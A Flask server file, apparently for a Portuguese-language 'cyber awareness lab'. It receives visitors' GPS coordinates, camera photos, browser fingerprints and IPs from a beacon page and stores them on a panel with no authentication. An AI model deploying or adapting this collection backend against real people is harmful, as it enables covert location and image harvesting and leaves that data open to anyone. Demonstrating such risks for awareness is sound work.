"""Cyber Awareness Lab — painel de coletas (Flask) com API e persistência em BD."""

from __future__ import annotations

import json
import logging
import os
import time
import uuid
from typing import Any

from flask import Flask, jsonify, render_template, request
from werkzeug.middleware.proxy_fix import ProxyFix

import storage

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

if os.environ.get("TRUST_PROXY", "").strip().lower() in ("1", "true", "yes", "on"):
    app.wsgi_app = ProxyFix(
        app.wsgi_app,
        x_for=1,
        x_proto=1,
        x_host=1,
        x_prefix=1,
    )
    log.info("TRUST_PROXY: ProxyFix ativo (X-Forwarded-Prefix / X-Forwarded-For)")

storage.init_db()
log.info("Persistência: %s", storage.backend())

# Relatórios “beacon” (/b): fotos, geo e pacote completo na base de dados.
_BEACON_MAX_PHOTO_B64 = 500_000
_DEVICE_LABEL_MAX = 120


def _simple_hash_str(s: str) -> str:
    """FNV-1a 32-bit igual ao simpleHash() em ver.js / beacon."""
    h = 2166136261
    for ch in s:
        h ^= ord(ch)
        h = (h * 16777619) & 0xFFFFFFFF
    return format(h & 0xFFFFFFFF, "x")


def _device_key_from_bundle(bundle: dict, client_ip: str) -> str:
    fp = bundle.get("fingerprint") if isinstance(bundle.get("fingerprint"), dict) else {}
    ua = str(bundle.get("user_agent") or fp.get("user_agent") or "").strip()
    langs = fp.get("languages")
    lang_join = ",".join(str(x) for x in langs) if isinstance(langs, list) else ""
    parts = [
        str((fp.get("canvas") or {}).get("hash32") or ""),
        str(fp.get("screen") or ""),
        str(fp.get("language") or ""),
        lang_join,
        str(fp.get("timezone") or ""),
        ua,
    ]
    raw = "||".join(p for p in parts if p)
    if not raw:
        return "k:" + _simple_hash_str(f"{client_ip}|anon")
    return "k:" + _simple_hash_str(raw)


def _client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "unknown"


def _security_headers(resp):
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = (
        "geolocation=(self), camera=(self), microphone=(), payment=()"
    )
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'; "
        "img-src 'self' data: blob:; "
        "font-src 'self' https://fonts.gstatic.com; "
        "style-src 'self' https://fonts.googleapis.com; "
        "script-src 'self'; "
        "connect-src 'self' https://nominatim.openstreetmap.org"
    )
    return resp


@app.after_request
def add_headers(resp):
    resp = _security_headers(resp)
    if request.path.startswith("/api/"):
        resp.headers["Cache-Control"] = "no-store, max-age=0, must-revalidate"
        resp.headers["Pragma"] = "no-cache"
        resp.headers["Expires"] = "0"
    return resp


@app.get("/")
def index():
    """Painel principal de coletas e auditoria."""
    return render_template("ver.html")


@app.get("/ver")
def ver():
    """Mesmo painel que `/` (URL alternativa)."""
    return render_template("ver.html")


@app.get("/b")
def beacon_page():
    """Página mínima para envio de coleta (GPS/câmera) para o painel."""
    return render_template("beacon.html")


@app.get("/api/ping")
def api_ping():
    """Diagnóstico rápido: confirma que o tráfego chega a este Flask (útil atrás de túnel/proxy)."""
    return jsonify({"ok": True, "service": "cyber-awareness-lab"})


@app.get("/api/server-meta")
def server_meta():
    """Dados que qualquer site vê no handshake HTTP (lado servidor)."""
    sid = str(uuid.uuid4())
    payload = {
        "session_id": sid,
        "server_sees": {
            "ip_as_seen_by_server": _client_ip(),
            "method": request.method,
            "path": request.path,
            "host": request.host,
            "scheme": request.scheme,
            "user_agent": request.headers.get("User-Agent", ""),
            "accept_language": request.headers.get("Accept-Language", ""),
            "accept_encoding": request.headers.get("Accept-Encoding", ""),
            "sec_ch_ua": request.headers.get("Sec-CH-UA", ""),
            "sec_ch_ua_mobile": request.headers.get("Sec-CH-UA-Mobile", ""),
            "sec_ch_ua_platform": request.headers.get("Sec-CH-UA-Platform", ""),
            "forwarded_for_raw": request.headers.get("X-Forwarded-For", ""),
            "referer": request.headers.get("Referer", ""),
        },
    }
    try:
        storage.insert_audit(
            {
                "ts": time.time(),
                "type": "server_meta_view",
                "ip": payload["server_sees"]["ip_as_seen_by_server"],
                "ua_short": (payload["server_sees"]["user_agent"] or "")[:120],
                "session_id": sid,
            }
        )
    except Exception as ex:
        log.exception("Falha ao gravar auditoria: %s", ex)
    return jsonify(payload)


@app.post("/api/lab-report")
def lab_report():
    """Recebe o pacote JSON do cliente (`client_bundle`)."""
    try:
        body = request.get_json(force=True, silent=False) or {}
    except Exception:
        return jsonify({"ok": False, "error": "JSON inválido"}), 400

    bundle = body.get("client_bundle") or {}
    safe_bundle = dict(bundle) if isinstance(bundle, dict) else {}
    if "photo_jpeg_base64" in safe_bundle:
        ph = safe_bundle["photo_jpeg_base64"]
        safe_bundle["photo_jpeg_base64"] = (
            f"<truncado {len(ph) if isinstance(ph, str) else 0} chars>"
        )

    entry = {
        "ts": time.time(),
        "type": "lab_report",
        "ip": _client_ip(),
        "bundle_keys": list(safe_bundle.keys()) if isinstance(safe_bundle, dict) else [],
        "bundle_preview": json.dumps(safe_bundle, ensure_ascii=False)[:4000],
    }
    try:
        storage.insert_audit(entry)
    except Exception as ex:
        log.exception("Falha ao gravar auditoria: %s", ex)
    log.info("lab_report from %s keys=%s", entry["ip"], entry["bundle_keys"])

    if body.get("beacon_capture") and isinstance(bundle, dict):
        photo = bundle.get("photo_jpeg_base64")
        if isinstance(photo, str) and len(photo) > _BEACON_MAX_PHOTO_B64:
            photo = photo[:_BEACON_MAX_PHOTO_B64]
        client_ip = _client_ip()
        device_key = _device_key_from_bundle(bundle, client_ip)
        dn = bundle.get("device_display_name")
        if isinstance(dn, str):
            dn_st = dn.strip()
            if dn_st:
                storage.upsert_label(device_key, dn_st[:_DEVICE_LABEL_MAX])
        name_snap = storage.get_label(device_key)
        fp_store = bundle.get("fingerprint") if isinstance(bundle.get("fingerprint"), dict) else {}
        ua_store = str(
            bundle.get("user_agent") or fp_store.get("user_agent") or request.headers.get("User-Agent", "")
        )
        raw_bundle: dict[str, Any] = dict(bundle) if isinstance(bundle, dict) else {}
        ev_row = {
            "ts": time.time(),
            "ip": client_ip,
            "user_agent": ua_store,
            "device_key": device_key,
            "collected_at": bundle.get("collected_at"),
            "beacon_context": bundle.get("beacon_context")
            if isinstance(bundle.get("beacon_context"), dict)
            else {},
            "geolocation": bundle.get("geolocation"),
            "camera_status": bundle.get("camera_status"),
            "camera_debug": bundle.get("camera_debug")
            if isinstance(bundle.get("camera_debug"), dict)
            else {},
            "fingerprint": fp_store,
            "photo_jpeg_base64": photo if isinstance(photo, str) else None,
            "raw_bundle": raw_bundle,
            "device_label": name_snap,
        }
        try:
            storage.insert_beacon(ev_row)
        except Exception as ex:
            log.exception("Falha ao gravar beacon: %s", ex)

    return jsonify({"ok": True, "received_keys": entry["bundle_keys"]})


@app.get("/api/beacon-tail")
def beacon_tail():
    """Últimos envios da rota /b e nomes amigáveis (PostgreSQL ou SQLite)."""
    try:
        events = storage.list_beacons(200)
    except Exception as ex:
        log.exception("Falha ao ler beacons: %s", ex)
        events = []
    events = list(reversed(events))
    for row in events:
        dk = row.get("device_key")
        if not (isinstance(dk, str) and dk.strip()):
            fp = row.get("fingerprint") if isinstance(row.get("fingerprint"), dict) else {}
            ua = str(row.get("user_agent") or fp.get("user_agent") or "").strip()
            bundle_like = {"fingerprint": fp, "user_agent": ua}
            row["device_key"] = _device_key_from_bundle(bundle_like, str(row.get("ip") or ""))
    try:
        raw_lab = storage.all_labels()
        labels = {str(k).strip(): str(v).strip() for k, v in raw_lab.items() if str(k).strip()}
    except Exception as ex:
        log.exception("Falha ao ler labels: %s", ex)
        labels = {}
    for ev in reversed(events):
        dk = ev.get("device_key")
        dk = str(dk).strip() if dk is not None else ""
        snap = ev.get("device_label")
        if dk and isinstance(snap, str) and snap.strip() and dk not in labels:
            labels[dk] = snap.strip()
    return jsonify({"events": events, "labels": labels})


@app.post("/api/device-label")
def device_label():
    """Define ou altera o nome amigável de um dispositivo (chave = device_key no /ver)."""
    try:
        body = request.get_json(force=True, silent=False) or {}
    except Exception:
        return jsonify({"ok": False, "error": "JSON inválido"}), 400
    key = str(body.get("device_key") or "").strip()
    label = str(body.get("label") or "").strip()
    if not key:
        return jsonify({"ok": False, "error": "device_key obrigatório"}), 400
    try:
        if not label:
            storage.delete_label(key)
            log.info("device_label removido device_key=%s", key[:24] if key else "")
        else:
            storage.upsert_label(key, label[:_DEVICE_LABEL_MAX])
            log.info("device_label gravado device_key=%s", key[:24] if key else "")
        return jsonify({"ok": True, "labels": {str(k).strip(): str(v).strip() for k, v in storage.all_labels().items() if str(k).strip()}})
    except Exception as ex:
        log.exception("device-label: %s", ex)
        return jsonify({"ok": False, "error": str(ex)}), 500


@app.get("/api/audit-tail")
def audit_tail():
    """Últimos eventos de auditoria (gravados na base de dados)."""
    try:
        items = storage.list_audit_tail(30)
    except Exception as ex:
        log.exception("Falha ao ler auditoria: %s", ex)
        items = []
    return jsonify({"events": items})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8787, debug=False)
